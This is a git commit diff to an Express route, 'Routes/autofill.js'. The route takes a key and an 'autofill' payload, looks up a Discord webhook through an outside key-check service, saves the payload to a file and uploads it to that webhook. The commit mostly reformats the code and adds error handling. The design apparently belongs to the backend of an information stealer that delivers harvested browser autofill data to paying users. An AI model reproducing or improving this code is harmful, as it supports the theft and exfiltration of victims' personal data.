c73587303a329c0536933524d763ab8e5525b4cd
zibrahimsm <167458781+zibrahimsm@users.noreply.github.com>
2024-04-25 21:22:39 +0300

    Update autofill.js

--- Routes/autofill.js
+++ Routes/autofill.js
@@ -6,32 +6,39 @@ const axios = require('axios');
 module.exports = async (req, res) => {
     const { key, autofill } = req.body;
 
-    if (!key) return res.sendStatus(400);
+    if (!key) {
+        return res.sendStatus(400); 
+    }
 
     try {
-		const response = await axios.get('https://bgg-7xht.onrender.com/keysorgu?key=${key}&api_auth=1295');
+        const response = await axios.get(`https://bgg-7xht.onrender.com/keysorgu?key=${key}&api_auth=1295`);
+        const webhook = response.data;
 
-  const webhook = response.data;
+        if (!webhook) {
+            return res.sendStatus(400); 
+        }
 
-        if (!webhook) return res.sendStatus(400);
-
-        const randomstringg = crypto.randomBytes(4).toString('hex');
+        const randomstringg = crypto.randomBytes(5).toString('hex');
         const content = autofill;
 
+        try {
         await fs.writeFile(`./Vct/autofill/${randomstringg}.txt`, content);
 
-        const webhookClient = new WebhookClient({ url: webhook });
-        await webhookClient.send({
-            files: [{
+            const webhookClient = new WebhookClient({ url: webhook });
+            await webhookClient.send({
+                files: [{
                 attachment: `./Vct/autofill/${randomstringg}.txt`,
                 name: `${randomstringg}autofill.txt`
-            }]
-        });
+                }]
+            });
 
-		
-        return res.sendStatus(200);
+            return res.sendStatus(200);
+        } catch (err) {
+            console.error(err);
+            return res.status(500).json({ error: 'Internal Server Error' });
+        }
     } catch (err) {
-       
+        console.error(err);
         return res.status(500).json({ error: 'Internal Server Error' });
     }
 };
